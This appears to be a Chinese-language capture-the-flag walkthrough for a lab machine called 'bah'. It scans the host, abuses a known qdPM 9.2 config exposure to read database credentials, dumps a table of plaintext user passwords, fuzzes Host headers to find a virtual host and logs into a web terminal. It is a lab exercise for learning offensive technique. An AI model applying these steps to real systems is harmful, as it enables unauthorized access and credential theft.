
|   |   |   |
|---|---|---|
|bah|easy|qdpmcms利用、mysql利用、host碰撞、shellinaboxd使用、pspy分析隐藏进程提权|


```c
┌──(kali㉿kali)-[~]
└─$ sudo netdiscover -i eth0 -r 192.168.44.141/24
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p- 192.168.44.141 
```
80 3306
```css
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.44.141/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,png -e
```

访问80发现是qdPMcms的网站，直接searchsploit
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit qdPM 
qdPM 9.2 - Cross-site Request Forgery (CSR | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthentica | php/webapps/50176.txt

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit -m php/webapps/50176.txt

https://www.exploit-db.com/exploits/50176
http://<website>/core/config/databases.yml
```

下载得到数据库的用户密码http://192.168.44.141/core/config/databases.yml
```c
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qpm;host=localhost'
      profiler: false
      username: qpmadmin
      password: "<?php echo urlencode('qpmpazzw') ; ?>"
      attributes:
        quote_identifier: true  
```

重新安装漏洞http://192.168.44.141/install
但是登陆时候确是404http://192.168.44.141/index.php/login

想到刚开开启的3306端口可以登录数据库
```c
                                                                             
┌──(kali㉿kali)-[~]
└─$ mysql -uqpmadmin -pqpmpazzw -h192.168.44.141     
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 58
Server version: 10.5.11-MariaDB-1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hidden             |
| information_schema |
| mysql              |
| performance_schema |
| qpm                |
+--------------------+
5 rows in set (0.003 sec)

MariaDB [(none)]> use hidden
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [hidden]> show tables;
+------------------+
| Tables_in_hidden |
+------------------+
| url              |
| users            |
+------------------+
2 rows in set (0.002 sec)

MariaDB [hidden]> select * from users;
+----+---------+---------------------+
| id | user    | password            |
+----+---------+---------------------+
|  1 | jwick   | Ihaveafuckingpencil |
|  2 | rocio   | Ihaveaflower        |
|  3 | luna    | Ihavealover         |
|  4 | ellie   | Ihaveapassword      |
|  5 | camila  | Ihaveacar           |
|  6 | mia     | IhaveNOTHING        |
|  7 | noa     | Ihaveflow           |
|  8 | nova    | Ihavevodka          |
|  9 | violeta | Ihaveroot           |
+----+---------+---------------------+
9 rows in set (0.002 sec)

MariaDB [hidden]> select * from url;
+----+-------------------------+
| id | url                     |
+----+-------------------------+
|  1 | http://portal.bah.hmv   |
|  2 | http://imagine.bah.hmv  |
|  3 | http://ssh.bah.hmv      |
|  4 | http://dev.bah.hmv      |
|  5 | http://party.bah.hmv    |
|  6 | http://ass.bah.hmv      |
|  7 | http://here.bah.hmv     |
|  8 | http://hackme.bah.hmv   |
|  9 | http://telnet.bah.hmv   |
| 10 | http://console.bah.hmv  |
| 11 | http://tmux.bah.hmv     |
| 12 | http://dark.bah.hmv     |
| 13 | http://terminal.bah.hmv |
+----+-------------------------+
13 rows in set (0.002 sec)

MariaDB [hidden]> 

```


使用host碰撞工具获取访问域名，记得在HostCollision-2.2.8/dataSource/下配置好域名和ip
```c
┌──(kali㉿kali)-[~/Desktop/红队工具/HostCollision-2.2.8]
└─$ java -jar HostCollision.jar
```


或者使用wfuzz 进行碰撞
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ wfuzz -c -w url -u 192.168.44.141 -H "HOST: FUZZ"

000000005:   200        0 L      1 W        46 Ch       "party.bah.hmv - party.bah.hmv"
```

host绑定后访问这个域名
```c
sudo vim /etc/hosts

使用这个用户密码ssh|  2 | rocio   | Ihaveaflower        |
使用上面的密码获取一个web 版的ssh（shellinabox：一款使用 AJAX 的基于 Web 的终端模拟器）


```